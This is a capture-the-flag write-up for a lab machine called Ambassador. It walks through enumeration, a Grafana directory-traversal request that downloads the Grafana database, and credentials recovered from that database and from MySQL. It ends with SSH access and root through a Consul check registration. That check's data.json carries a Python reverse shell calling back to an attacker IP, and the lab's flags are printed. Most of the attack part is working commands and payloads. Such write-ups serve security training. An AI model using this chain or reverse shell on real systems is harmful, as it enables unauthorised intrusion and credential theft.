# Ambassador

## Enumeration
### Nmap
SSH: 8.2p1
HTTP: Apache 2.4.41
    p80/p3000
    https://www.cvedetails.com/cve/CVE-2020-11984/
SQL: p3306 MySQL 8.0.30

### Web p80
GoHugo Framework
Theme: ananke

Pages:
/index.xml

### Web p3000
Grafana v8.2.0
```bash
searchsploit Grafana
----------------------------------------- ---------------------------------
 Exploit Title                           |  Path
----------------------------------------- ---------------------------------
Grafana 7.0.1 - Denial of Service (PoC)  | linux/dos/48638.sh
Grafana 8.3.0 - Directory Traversal and  | multiple/webapps/50581.py
----------------------------------------- ---------------------------------
Shellcodes: No Results
```
#### Login as admin
admin:messageInABottle685427

#### Download database
$ curl --path-as-is http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db
$ sqlite3 grafana.db
sqlite> select * from data_source;
2|1|1|mysql|mysql.yaml|proxy||dontStandSoCloseToMe63221!|grafana|grafana|0|||0|{}|2022-09-01 22:43:03|2022-12-07 14:57:21|0|{}|1|uKewFgM4z

### MySQL p3306
grafana:dontStandSoCloseToMe63221!

mysql> use whackywidget;
mysql> select * from user;
developer:YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==
$ echo 'YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==' | base64 -d 
anEnglishManInNewYork027468

## Foothold
### LFI grafana
See exploit script

Users: developer

### SSH
developer:anEnglishManInNewYork027468

developer $ cat user.txt
c1e6b3f10659283ef15a0423ff382e32

#### Ports
```bash
[-] Listening TCP:
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8300          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8301          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8302          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8500          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8600          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::3000                 :::*                    LISTEN      -                   


[-] Listening UDP:
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
udp        0      0 127.0.0.1:8600          0.0.0.0:*                           -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   
udp        0      0 127.0.0.1:8301          0.0.0.0:*                           -                   
udp        0      0 127.0.0.1:8302          0.0.0.0:*                           - 
```

#### Packages
SGID: at 3.1.23
CVE-2002-1614

lxc 4.0.9

#### WHackywidget
/opt/my-app

$ export CONSUL_HTTP_TOKEN=bb03b43b-1d81-d62b-24b5-39540ee469b5

$ curl --header "X-Consul-Token: bb03b43b-1d81-d62b-24b5-39540ee469b5" --request PUT --data @data.json http://127.0.0.1:8500/v1/agent/check/register

data.json
```javascript
{
  "ID": "rce",
  "Name": "Remote Code Execution",
  "Args": ["python3", "-c", "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.16.5',9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.Popen(['/bin/sh','-i']);"],
  "Shell": "/bin/bash",
  "Interval": "5s"
}
```
root $ cat /root/root.txt
36b5be46f3936726d92e4195e4b0da1c
